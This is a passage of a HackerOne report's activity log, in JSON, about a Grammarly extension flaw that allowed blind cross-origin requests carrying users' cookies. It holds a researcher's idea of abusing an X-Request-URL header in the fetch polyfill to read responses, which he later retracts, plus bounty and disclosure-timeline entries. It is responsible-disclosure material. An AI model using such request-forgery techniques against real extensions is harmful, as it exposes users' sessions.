end\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-08T09:12:42.797Z","updated_at":"2018-08-08T09:12:42.797Z","actor":{"username":"andriy_derevyanko","cleared":false,"url":"/andriy_derevyanko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/232/429/8d025f5ca823ddfa62ce186084ff79b3e72542ed_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"metnew","url":"/metnew"},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3162947,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @grammarly \nThanks for the great bounty!\n@andriy_derevyanko  - Yeah, the issue was fixed. Thanks for the quick resolution. \n\u003e I hope that's only the beginning 😈","markdown_message":"\u003cp\u003eHi \u003ca href=\"/grammarly\"\u003e@grammarly\u003c/a\u003e \u003cbr\u003e\nThanks for the great bounty!\u003cbr\u003e\n\u003ca href=\"/andriy_derevyanko\"\u003e@andriy_derevyanko\u003c/a\u003e  - Yeah, the issue was fixed. Thanks for the quick resolution. \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI hope that\u0026#39;s only the beginning 😈\u003c/p\u003e\n\u003c/blockquote\u003e\n","automated_response":false,"created_at":"2018-08-08T19:09:50.348Z","updated_at":"2018-08-08T19:09:50.348Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3184387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@grammarly @andriy_derevyanko  I think it is possible to send not only \"blind\" XHRs, because of this header in `fetch` polyfill:\n``` js\nurl: \"responseURL\"in i ? i.responseURL : /^X-Request-URL:/m.test(i.getAllResponseHeaders()) ? i.getResponseHeader(\"X-Request-URL\") : void 0\n```\n\nAttacker just needs to include own server url to `X-Request-URL` header. \n\nSome additional materials:\n1. https://github.com/github/fetch/issues/443#issuecomment-262225338\n\n\u003e May it increases bounty somehow if I'll attach a PoC?)","markdown_message":"\u003cp\u003e\u003ca href=\"/grammarly\"\u003e@grammarly\u003c/a\u003e \u003ca href=\"/andriy_derevyanko\"\u003e@andriy_derevyanko\u003c/a\u003e  I think it is possible to send not only \u0026quot;blind\u0026quot; XHRs, because of this header in \u003ccode\u003efetch\u003c/code\u003e polyfill:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eresponseURL\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseURL\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sr\"\u003e/^X-Request-URL:/m\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetAllResponseHeaders\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetResponseHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eX-Request-URL\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"k\"\u003evoid\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAttacker just needs to include own server url to \u003ccode\u003eX-Request-URL\u003c/code\u003e header. \u003c/p\u003e\n\n\u003cp\u003eSome additional materials:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/github/fetch/issues/443#issuecomment-262225338\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgithub%2Ffetch%2Fissues%2F443%23issuecomment-262225338\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/github/fetch/issues/443#issuecomment-262225338\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eMay it increases bounty somehow if I\u0026#39;ll attach a PoC?)\u003c/p\u003e\n\u003c/blockquote\u003e\n","automated_response":false,"created_at":"2018-08-13T01:51:52.779Z","updated_at":"2018-08-13T01:51:52.779Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3186547,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@metnew thanks for extra information. Let us, please, review this case internally and I'll revert back to you with the response.","markdown_message":"\u003cp\u003e\u003ca href=\"/metnew\"\u003e@metnew\u003c/a\u003e thanks for extra information. Let us, please, review this case internally and I\u0026#39;ll revert back to you with the response.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-13T09:43:51.210Z","updated_at":"2018-08-13T09:43:51.210Z","actor":{"username":"andriy_derevyanko","cleared":false,"url":"/andriy_derevyanko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/232/429/8d025f5ca823ddfa62ce186084ff79b3e72542ed_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3189936,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've made a deeper research and it seems impossible to redirect response using Origin/Host headers :(\n@andriy_derevyanko ","markdown_message":"\u003cp\u003eI\u0026#39;ve made a deeper research and it seems impossible to redirect response using Origin/Host headers :(\u003cbr\u003e\n\u003ca href=\"/andriy_derevyanko\"\u003e@andriy_derevyanko\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-14T01:21:39.257Z","updated_at":"2018-08-14T01:21:39.257Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3190913,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@andriy_derevyanko Also, I've read your review on this report [thanks :)]. However, H1 team didn't disclose  Grammarly team contact details. I'd be glad if you can send me details by email: ██████","markdown_message":"\u003cp\u003e\u003ca href=\"/andriy_derevyanko\"\u003e@andriy_derevyanko\u003c/a\u003e Also, I\u0026#39;ve read your review on this report [thanks :)]. However, H1 team didn\u0026#39;t disclose  Grammarly team contact details. I\u0026#39;d be glad if you can send me details by email: ██████\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-14T08:32:36.684Z","updated_at":"2019-08-01T16:44:23.408Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3193549,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@metnew thanks for your contact. I also have them from Git – will drop you an email today.\nWith regards to this ticket. Are we considering it closed, right?","markdown_message":"\u003cp\u003e\u003ca href=\"/metnew\"\u003e@metnew\u003c/a\u003e thanks for your contact. I also have them from Git – will drop you an email today.\u003cbr\u003e\nWith regards to this ticket. Are we considering it closed, right?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-14T09:38:46.783Z","updated_at":"2018-08-14T09:38:46.783Z","actor":{"username":"andriy_derevyanko","cleared":false,"url":"/andriy_derevyanko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/232/429/8d025f5ca823ddfa62ce186084ff79b3e72542ed_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3193556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, closed","markdown_message":"\u003cp\u003eYeah, closed\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-14T09:44:10.142Z","updated_at":"2018-08-14T09:44:10.142Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3806352,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-11T15:49:03.018Z","updated_at":"2018-12-11T15:49:03.018Z","first_to_agree":true,"actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3830762,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-15T03:25:44.991Z","updated_at":"2018-12-15T03:25:44.991Z","additional_data":{"old_title":"\"Universal CSRF\" through extension (XHR to any origin with cookies) + control over `p.tracker.gnar` + [im]possible UXSS","new_title":"Handling of `tracking` command allows making arbitrary requests with user's cookies"},"actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3942297,"is_internal":false,"editable":false,"type":"Activities::CancelledDisclosureRequest","message":"@vladimir_suslenko per our agreement, we are postponing the disclosure to clarify all the details (external communication and legal aspects). ","markdown_message":"\u003cp\u003e\u003ca href=\"/vladimir_suslenko\"\u003e@vladimir_suslenko\u003c/a\u003e per our agreement, we are postponing the disclosure to clarify all the details (external communication and legal aspects). \u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-08T12:55:28.392Z","updated_at":"2019-01-08T12:55:28.392Z","actor":{"username":"andriy_derevyanko","cleared":false,"url":"/andriy_derevyanko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/232/429/8d025f5ca823ddfa62ce186084ff79b3e72542ed_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5445035,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-27T17:33:33.820Z","updated_at":"2019-07-27T17:33:33.820Z","first_to_agree":true,"actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5471313,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-31T15:14:53.902Z","updated_at":"2019-07-31T15:14:53.902Z","additional_data":{"old_title":"Handling of `tracking` command allows making arbitrary requests with user's cookies","new_title":"Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin"},"actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5480761,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-01T15:59:18.461Z","updated_at":"2019-08-01T15:59:18.461Z","actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5480762,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-01T15:59:18.819Z","updated_at":"2019-08-01T15:59:18.819Z","actor":{"username":"vladimir_suslenko","cleared":false,"url":"/vladimir_suslenko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}